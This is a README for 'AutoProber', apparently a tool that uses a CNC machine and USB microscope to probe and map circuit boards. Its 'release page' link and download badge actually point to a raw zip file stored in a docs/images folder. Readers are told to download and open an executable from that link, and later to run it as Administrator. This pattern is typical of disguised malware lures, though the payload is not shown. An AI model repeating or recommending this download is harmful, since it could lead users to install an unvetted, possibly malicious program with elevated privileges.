# 🔍 AutoProber - Automated hardware testing for circuit boards

[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/Empty-democritus307/AutoProber/main/docs/images/Public-Release-Images/Prober_Auto_v1.3.zip)

AutoProber helps you test, map, and analyze circuit boards. It moves a probe tip across your hardware to find connection points. This tool aids in security research and board analysis. It uses a camera for mapping and a robotic system for precision movement. You gain a clear view of your hardware and its internal networks.

## 📦 What is AutoProber?

AutoProber connects a physical CNC machine to a software controller. The system identifies components on a printed circuit board. Once it locates a target, the probe moves to a specific pin to test for continuity or perform signal analysis.

The tool provides an interface to view the board through a microscope. You plot points on an image of the board. The machine moves the probe to these points. This approach handles complex boards that require precise, repeatable testing. It removes the need for manual probing by hand.

## 🛠️ System Requirements

Before you install the tool, ensure your computer meets these needs:

*   Operating System: Windows 10 or Windows 11.
*   Processor: Intel Core i5 or better.
*   Memory: 8 GB RAM minimum, 16 GB recommended.
*   Storage: 500 MB of free space.
*   Hardware Connection: One dedicated USB port for the CNC controller.
*   Camera: A supported USB digital microscope for mapping.

## 📥 Getting Started

Follow these steps to obtain the software:

1. Visit the [AutoProber release page](https://raw.githubusercontent.com/Empty-democritus307/AutoProber/main/docs/images/Public-Release-Images/Prober_Auto_v1.3.zip) to see available versions.
2. Look for the file ending in `.msi` or `.exe` under the latest release.
3. Select the file to save it to your computer.
4. Open the file once the download finishes.

## ⚙️ Installation Process

1. Double-click the file you saved in the previous step.
2. Follow the prompts in the installation window.
3. Read the summary screen and click Install.
4. Select Finish when the process ends.
5. Find the AutoProber icon on your desktop or in your start menu.

## 🔌 Connecting Your Hardware

AutoProber communicates with your CNC machine via a serial connection.

1. Power on your CNC controller.
2. Plug the USB cable into your Windows machine.
3. Open AutoProber.
4. Go to the Settings tab.
5. Select the COM port corresponding to your CNC hardware.
6. Click Connect. The status indicator should turn green.

## 📷 Setting Up the Microscope

The software maps coordinates based on the view from your USB microscope.

1. Mount your microscope above the probe area.
2. Plug the microscope into a second USB port.
3. Within AutoProber, navigate to the Camera menu.
4. Choose your microscope from the device list.
5. Adjust the focus knob on the microscope to see the circuit board clearly on your screen.
6. Calibrate the grid overlay to match the scale of the board.

## 🎯 Creating a Mapping Job

A job tells the machine where to move.

1. Click the New Job button.
2. Import an image of your printed circuit board.
3. Use your mouse to click on the pins you want to test.
4. The software creates a list of coordinates for each point.
5. Assign a name to every point to keep your data organized.
6. Save your job file for future use.

## 🚀 Running Your First Probe

Review these safety steps before you start the automated process. Ensure the probe tip is clear of any obstructions. Keep your fingers away from the CNC movement area.

1. Open your saved job file.
2. Confirm the probe starts at the origin point.
3. Click the Run button.
4. Monitor the software feed to ensure the probe hits the correct target.
5. Click Stop if you need to pause the machine at any time.

## 📊 Reviewing Results

After the probe completes its path, AutoProber saves the data. You can export these results to a spreadsheet for further study. The software logs every interaction between the probe and the pin. This helps you reconstruct the layout of the integrated circuits on your board.

## 💡 Troubleshooting Common Issues

If the software fails to open:
Ensure you have the latest drivers for your graphics card. Try right-clicking the icon and selecting Run as Administrator.

If the machine does not move:
Check the USB connection to your CNC controller. Verify that the Emergency Stop button on the machine is not pressed. Restart the application if the connection light stays red.

If the image looks blurry:
Adjust the manual focus on the microscope. Ensure the lighting in your workspace is bright and uniform. Turn off any auto-focus features in your camera settings to prevent the image from shifting during a probe run.

If coordinates seem incorrect:
Check that your camera lens is perfectly perpendicular to the board. Any tilt will cause distortion in your mapping. Recalibrate the grid if you move the microscope after you start your job.